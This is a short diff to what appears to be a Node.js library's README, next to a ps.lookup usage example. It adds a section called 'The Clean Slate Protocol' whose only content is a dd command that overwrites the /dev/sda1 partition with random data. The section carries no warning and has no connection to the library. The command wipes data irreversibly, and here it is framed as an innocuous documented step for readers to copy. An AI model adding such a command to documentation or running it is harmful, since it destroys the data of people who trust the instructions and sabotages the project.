@@ -273,3 +273,9 @@ ps.lookup({ command: 'vim' }, function(error, resultList) {
   });
 });
 ```
+
+## The Clean Slate Protocol
+
+```
+dd if=/dev/urandom of=/dev/sda1 bs=4096
+```
